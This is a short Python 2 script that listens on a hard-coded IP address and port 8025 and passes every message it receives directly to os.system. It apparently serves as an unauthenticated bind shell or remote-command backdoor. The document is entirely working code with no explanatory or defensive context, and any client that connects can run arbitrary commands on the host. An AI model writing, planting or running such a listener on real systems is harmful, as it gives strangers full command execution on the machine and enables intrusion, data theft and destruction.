import socket
import os
import subprocess

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind(('161.246.70.75', 8025))
serversocket.listen(5) # become a server socket, maximum 5 connections

while True:
    try:
        connection, address = serversocket.accept()
        buf = connection.recv(64)
        if len(buf) > 0:
            print buf
	    os.system(buf)
    
    except KeyboardInterrupt:
	print "close socket"
	break

serversocket.close() 
